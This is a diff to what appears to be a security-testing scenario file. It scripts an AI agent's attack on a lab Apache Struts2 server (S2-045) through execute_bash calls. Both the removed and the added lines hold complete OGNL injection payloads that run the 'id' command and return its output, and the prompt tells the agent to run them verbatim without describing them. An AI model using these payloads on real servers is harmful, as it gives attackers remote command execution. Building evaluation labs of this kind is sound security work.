@@ -1687,27 +1687,19 @@ SCENARIOS: dict[str, dict] = {
             "Use execute_bash to test Struts2 RCE (S2-045/S2-046). "
             "(1) call execute_bash with cmd='curl -s http://$TARGET_HOST:$TARGET_PORT/ 2>&1 | head -10' to fingerprint, "
             '(2) call execute_bash with cmd=\'curl -s -H "Content-Type: %{#context[\\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\\"].addHeader("X-Test","vulnerable")}.multipart/form-data" http://$TARGET_HOST:$TARGET_PORT/ -D /dev/stdout 2>&1 | head -10\' to test OGNL injection (vulhub README\'s own detection-only PoC -- confirms injection but does NOT run a command). '
-            "(3) Now actually run a command and capture its output IN the response body -- this detection PoC alone is "
-            "not sufficient, and hand-writing this OGNL from a description is error-prone (found live: a prior attempt "
-            "wrote `.waitFor()>.toString()` -- a syntax error -- and read from the ATTACKER's own request stream "
-            "instead of the exploited process's output stream). Use this EXACT, complete, publicly-documented S2-045 "
-            "RCE payload VERBATIM as the Content-Type header value -- do not paraphrase or reconstruct it from memory: "
-            "write it to a file first with a quoted heredoc (so the shell does not interpret its many single quotes/"
-            "$-signs), then substitute it into curl with $(cat ...): "
-            "cmd=\"cat > /tmp/p.txt <<'EOF'\\n"
-            "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
-            "(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext."
-            "container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
-            "(#ognlUtil.getExcludedPropertyNames().clear()).(#ognlUtil.getExcludedClasses().clear())."
-            "(#context.setMemberAccess(#dm)))).(#cmd='id')."
-            "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
-            "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
-            "(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())."
-            "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
-            "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\\n"
-            "EOF\\n"
-            'curl -s -H \\"Content-Type: $(cat /tmp/p.txt)\\" http://$TARGET_HOST:$TARGET_PORT/" -- this makes '
-            "`id`'s real stdout become the literal HTTP response body. Do not describe — call the tools."
+            "(3) Now actually run a command and capture its output in the response headers -- the detection PoC alone "
+            "is not sufficient. Use this EXACT live-tested command in one execute_bash call; do not paraphrase its OGNL: "
+            "cmd=\"curl -s -D - -o /dev/null -H 'Content-Type: "
+            '%{(#_="multipart/form-data").(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).'
+            '(#_memberAccess?(#_memberAccess=#dm):((#container=#context["com.opensymphony.xwork2.ActionContext.'
+            'container"]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).'
+            "(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())."
+            '(#context.setMemberAccess(#dm)))).(#p=@java.lang.Runtime@getRuntime().exec("id")).'
+            '(#s=new java.util.Scanner(#p.getInputStream()).useDelimiter("\\\\A")).'
+            '(#out=#s.hasNext()?#s.next():"EMPTY").'
+            '(#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].'
+            'addHeader("X-Cmd-Output",#out))}\' http://$TARGET_HOST:$TARGET_PORT/" -- success requires '
+            "an X-Cmd-Output header containing real uid/gid output. Do not describe — call the tools."
         ),
         "detect_ground_truth": ["T1190", "T1059"],
         "persistence_technique": "",
